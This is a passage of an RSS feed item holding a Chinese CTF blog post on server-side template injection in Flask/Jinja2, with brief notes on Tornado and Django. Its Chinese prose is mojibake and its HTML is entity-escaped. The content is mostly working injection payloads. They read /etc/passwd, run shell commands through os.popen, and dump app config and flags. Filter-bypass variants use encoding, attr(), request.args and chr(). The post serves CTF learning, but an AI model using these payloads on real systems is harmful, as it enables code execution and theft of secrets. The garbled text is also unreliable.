style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#39;open&amp;#39;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#39;/etc/passwd&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æˆ–è€…æ˜¯ç›´æŽ¥ç”¨&lt;code>__import__&lt;/code>åŠ è½½&lt;code>os&lt;/code>æ¨¡å—æ‰§è¡Œå‘½ä»¤&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__&amp;#39;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#39;os&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">popen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>py2æœ‰ä¸ªç‰¹æ®Šçš„&lt;code>commands&lt;/code>æ¨¡å—ä¹Ÿå¯ä»¥ç›´æŽ¥rce&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__&amp;#39;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#39;commands&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">getstatusoutput&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>â€”â€”â€”â€”â€”â€”æ³¨æ„å¼•ç”¨&lt;code>__builtins__&lt;/code>å†…å»ºæ¨¡å—è¿™ä¸€æ–¹å¼åœ¨py2&amp;amp;py3å®Œå…¨é€šæ€&lt;/p>
&lt;h2 id="å¸¸ç”¨payload">å¸¸ç”¨payload&lt;/h2>
&lt;p>å…¶å®žä¸Šé¢å·²ç»åˆ—ä¸¾çš„æ¯”è¾ƒå…¨å•¦ï¼Œè¿™é‡Œåšä¸€äº›å°å°çš„è¡¥å……&lt;/p>
&lt;h3 id="forè¯­å¥ç¡®å®šç´¢å¼•ä½ç½®">forè¯­å¥ç¡®å®šç´¢å¼•ä½ç½®&lt;/h3>
&lt;p>å‰é¢æåˆ°è¿‡ä¸€ç‚¹ï¼Œæˆ‘ä»¬éœ€è¦çš„å­ç±»åœ¨pythonä¸åŒç‰ˆæœ¬ä¸­ä½ç½®å¹¶ä¸å›ºå®šï¼ˆä¸»è¦æ˜¯py3 py2çš„åŸºæœ¬å›ºå®šæ­»äº†ï¼‰ï¼Œé’ˆå¯¹è¿™ä¸ªé—®é¢˜å¯ä»¥ç”¨Jinjaæ”¯æŒçš„forè¯­å¥æ¥è§£å†³ï¼Œsubmoduleçš„åå­—å¯ä»¥ç”¨ä¸Šé¢çš„è„šæœ¬è·‘&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">{% for c in ().__class__.__base__.__subclasses__() %}{% if c.__name__==&amp;#39;submodule&amp;#39; %}{{ c.__init__.__globals__[&amp;#39;__builtins__&amp;#39;].open(&amp;#39;filename&amp;#39;, &amp;#39;r&amp;#39;).read() }}{% endif %}{% endfor %}
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">{% for c in ().__class__.__base__.__subclasses__() %}{% if c.__name__==&amp;#39;submodule&amp;#39; %}{{c.__init__.__globals__[&amp;#39;__builtins__&amp;#39;].eval(&amp;#34;__import__(&amp;#39;os&amp;#39;).popen(&amp;#39;id&amp;#39;).read()&amp;#34;) }}{% endif %}{% endfor %}
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="ç‰¹æ®Šçš„ä¸€äº›å¯¹è±¡">ç‰¹æ®Šçš„ä¸€äº›å¯¹è±¡&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">{{config}}
{{config.items()}}
{{config.__class__.__init__.__globals__[&amp;#39;os&amp;#39;].popen(&amp;#39;ls&amp;#39;).read()}}
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">{{get_flashed_messages.__globals__[&amp;#39;current_app&amp;#39;].config}}
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">{{app.__init__.__globals__.sys.modules.app.app.__dict__}}
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">{{url_for.__globals__[&amp;#39;__builtins__&amp;#39;].__import__(&amp;#39;os&amp;#39;).system(&amp;#39;ls&amp;#39;)}}
{{url_for.__globals__[&amp;#39;current_app&amp;#39;].config.FLAG}}
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">{{request.__init__.__globals__[&amp;#39;__builtins__&amp;#39;].open(&amp;#39;/etc/passwd&amp;#39;).read()}}
{{request.application.__self__._get_data_for_json.__globals__[&amp;#39;json&amp;#39;].JSONEncoder.default.__globals__[&amp;#39;current_app&amp;#39;].config[&amp;#39;FLAG&amp;#39;]}}
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="å„ç§å„æ ·çš„bypass">å„ç§å„æ ·çš„bypass&lt;/h2>
&lt;p>ä¸€èˆ¬éƒ½ä¸ä¼šåªè¿‡æ»¤ä¸€ç§çš„ï¼Œç»¼åˆåº”ç”¨&lt;/p>
&lt;h3 id="é’ˆå¯¹å…³é”®å­—çš„è¿‡æ»¤">é’ˆå¯¹å…³é”®å­—çš„è¿‡æ»¤&lt;/h3>
&lt;p>ä»¥classä¸ºä¾‹ï¼Œåšä¸€ä¸ªå­—ç¬¦ä¸²çš„æ‹¼æŽ¥&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#d88200">&amp;#39;cl&amp;#39;&lt;/span>&lt;span style="color:#f92672">~&lt;/span>&lt;span style="color:#d88200">&amp;#39;ass&amp;#39;&lt;/span> &lt;span style="color:#75715e"># æ‹¼æŽ¥&lt;/span>
&lt;span style="color:#d88200">&amp;#34;cl&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#34;ass&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#d88200">&amp;#39;cla&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;ss&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># æ‹¼æŽ¥&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#d88200">&amp;#39;Y2xhc3M=&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;base64&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># b64&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\u0063\u006C\u0061\u0073\u0073&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span> &lt;span style="color:#75715e"># unicode&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\x63\x6c\x61\x73\x73&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span> &lt;span style="color:#75715e"># hex&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="è¿‡æ»¤">è¿‡æ»¤&lt;code>[]&lt;/code>&lt;/h3>
&lt;p>&lt;code>[]&lt;/code>ç”¨åœ¨å­—å…¸æŒ‰ç´¢å¼•å–å€¼å’Œæ•°ç»„ä¸­å–å€¼ï¼Œä¸è¿‡ç¦æ­¢äº†è¿˜æ˜¯æœ‰å‡½æ•°å¯ä»¥ç”¨&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;code>__getitem__&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__getitem__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__getitem__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__getitem__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;eval&amp;#39;&lt;/span>&lt;span style="color:#111">)(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__(&amp;#34;os&amp;#34;).popen(&amp;#34;ls /&amp;#34;).read()&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;code>pop()&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pop&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pop&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pop&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;eval&amp;#39;&lt;/span>&lt;span style="color:#111">)(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__(&amp;#34;os&amp;#34;).popen(&amp;#34;ls /&amp;#34;).read()&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;code>.&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__bases__&lt;/span>&lt;span style="color:#ae81ff">.0&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">linecache&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">popen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="è¿‡æ»¤-1">è¿‡æ»¤&lt;code>.&lt;/code>&lt;/h3>
&lt;p>&lt;code>.&lt;/code>ç‚¹å·ç”¨åœ¨å‘ä¸‹ä¸åœåœ°å–å€¼ï¼Œè·Ÿ&lt;code>[]&lt;/code>å¾ˆåƒ&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;__class__&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;code>attr()&lt;/code> å¾ˆå¼ºçš„ä¸€ä¸ªflaskå†…ç½®filterï¼Œ&lt;code>foo|attr(&amp;quot;bar&amp;quot;) == foo.bar&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">{{()&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">attr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__class__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">attr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__base__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">............&lt;/span>&lt;span style="color:#111">}}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="è¿‡æ»¤-2">è¿‡æ»¤&lt;code>'&lt;/code>&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;code>chr&lt;/code> å…ˆæ‰¾å‡º&lt;code>chr()&lt;/code>çš„ä½ç½®ï¼ˆæ³¨æ„è·‘è„šæœ¬è·‘çš„æ˜¯&lt;code>__builtins__&lt;/code> è¿™ä¸ªå‡½æ•°æ˜¯å†…å»ºçš„ï¼‰ï¼Œç”¨æ¨¡æ¿è¯­å¥ç»™å®ƒèµ‹ä¸ªå€¼ï¼Œç„¶åŽè°ƒç”¨&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">{% set chr=().__class__.__bases__[0].__subclasses__()[index].__init__.__globals__.__builtins__.chr%}{{().__class__.__bases__.[0].__subclasses__().pop(40)(chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100)).read()}}
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;code>request.args&lt;/code> flaskä¸­å­˜å‚¨è¯·æ±‚å‚æ•°åŠå€¼çš„å­—å…¸ï¼Œå¯ä»¥å°†å€¼å…ˆèµ‹ç»™å®ƒç„¶åŽè¿›è¡Œè°ƒç”¨&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">{{[].__class__.__base__.__subclasses__()[index].__init__.__globals__[request.args.arg1]}}&lt;span style="color:#960050;background-color:#1e0010">&amp;amp;&lt;/span>arg1=os
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="è¿‡æ»¤_">è¿‡æ»¤&lt;code>_&lt;/code>&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;code>request.args&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">{{&amp;#39;&amp;#39;[request.args.class][request.args.base][request.args.subclasses]()[index](&amp;#39;/etc/passwd&amp;#39;).read() }}&lt;span style="color:#960050;background-color:#1e0010">&amp;amp;&lt;/span>class=__class__&lt;span style="color:#960050;background-color:#1e0010">&amp;amp;&lt;/span>base=__base__&lt;span style="color:#960050;background-color:#1e0010">&amp;amp;&lt;/span>subclasses=__subclasses__
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>æŒ‰å­—ç¬¦ä¸²çš„æ–¹å¼èµ°ï¼Œä¹Ÿå¯&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="è¿‡æ»¤-3">è¿‡æ»¤&lt;code>{&lt;/code>&lt;/h3>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">{{}}&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">{&lt;/span>&lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="è¿‡æ»¤-">è¿‡æ»¤&lt;code> &lt;/code>&lt;/h3>
&lt;ul>
&lt;li>&lt;code>+&lt;/code>æ›¿ä»£&lt;/li>
&lt;/ul>
&lt;h2 id="å…¶å®ƒå§¿åŠ¿">å…¶å®ƒå§¿åŠ¿&lt;/h2>
&lt;h3 id="çŸ­çŸ­çŸ­">çŸ­çŸ­çŸ­&lt;/h3>
&lt;p>åˆ©ç”¨çš„æ˜¯Flaskä¸­çš„&lt;code>config&lt;/code>å¯¹è±¡ï¼Œå®ƒå¯ä»¥å­˜å‚¨ä¸€éƒ¨åˆ†è®¾ç½®é¡¹çš„å†…å®¹ï¼›&lt;code>config.update&lt;/code>æ–¹æ³•å¯ä»¥ç”¨æ¥å­˜å‚¨è®¾ç½®é¡¹ä¸­çš„å˜é‡ï¼Œç”¨æ³•æ˜¯&lt;code>config.update(key=value)&lt;/code>&lt;/p>
&lt;p>è¿™é‡Œç”¨ä¸€ä¸ªé¢˜åšä¾‹å­ï¼ŒæŒ‡è·¯-&amp;gt;&lt;a href="https://amiaaaz.github.io/2021/10/22/digitaloverdosectf2021-wp/#webmadlib">[Digital Overdose 2021 Autumn CTF madlib]&lt;/a>&lt;/p>
&lt;h3 id="pwn---åŠ«æŒgotè¡¨getshell">***pwn - åŠ«æŒgotè¡¨getshell&lt;/h3>
&lt;p>pwnï¼Œåœ¨å­¦äº†åœ¨å­¦äº†ï¼ŒæŒ‡æ–°å»ºæ–‡ä»¶å¤¹å’Œmdæ–‡æ¡£ðŸ˜…&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://ctf-wiki.org/pwn/sandbox/python/python-sandbox-escape/">Python æ²™ç®±é€ƒé€¸&lt;/a>&lt;/p>
&lt;h1 id="tornado">Tornado&lt;/h1>
&lt;p>Tornadoä¹Ÿæ˜¯ä¸€ç§æ¨¡æ¿ï¼Œå¯ä»¥æ‰§è¡Œç®€å•çš„è¡¨è¾¾å¼å’Œä¼ é€’å˜é‡ï¼Œå½“å‚æ•°å¯æŽ§æ—¶å¯èƒ½é€ æˆxsså’Œrce&lt;/p>
&lt;h2 id="å†…ç½®å­—å…¸å¯¹è±¡">å†…ç½®å­—å…¸å¯¹è±¡&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>&lt;code>handler.settings&lt;/code> æŒ‡å‘çš„æ˜¯RequestHandler.application.settings&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">{{handler.settings}}
{{escape(handler.settings[&amp;#34;cookie&amp;#34;])}}
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;h1 id="django">Django&lt;/h1>
&lt;p>Djangoæ˜¯ä¸€ä¸ªpythonçš„webæ¡†æž¶ï¼Œç›¸æ¯”flaskæ¯”è¾ƒåºžå¤§ä¸€ç‚¹ç‚¹ï¼›pç‰›çš„è¿™ç¯‡æ–‡ç« -&amp;gt;&lt;a href="https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html">Python æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´žï¼ˆDjangoä¸ºä¾‹ï¼‰&lt;/a>æŒ‡å‡ºäº†ä¸€ç§åˆ©ç”¨æ€è·¯ï¼Œé€šè¿‡Djangoé»˜è®¤çš„adminçš„modelæ¥èŽ·å–settingså¯¹è±¡ï¼Œè¿›è€ŒèŽ·å–æ•°æ®åº“è´¦å·å¯†ç ã€webåŠ å¯†å¯†é’¥ç­‰ä¿¡æ¯&lt;/p>
&lt;hr>
&lt;p>ä¸¤å‘¨ä¹‹å‰åŸºæœ¬æ€»ç»“è¿‡äº†ï¼Œä½†æ˜¯å‰ä¸¤å¤©é‡åˆ°è¦æž„é€ çš„å…·ä½“åœºæ™¯è¿˜æ˜¯æ‰“ä¸ç©¿ï¼ŒäºŽæ˜¯åˆæ‹äº†ä¸€éåˆ©ç”¨çš„æ€è·¯ï¼ŒæŠŠç¬”è®°æ•´ç†å‡ºæ¥äº†&lt;/p>
&lt;p>è¿™ä¸ªæ•…äº‹å‘Šè¯‰æˆ‘ä»¬å­¦ä¸œè¥¿è¦æ‰Žå®žï¼Œæ›´æ‰Žå®žä¸€ç‚¹ï¼Œä¸ç„¶ä¼šå¾ˆè›‹ç–¼&lt;/p></description></item></channel></rss>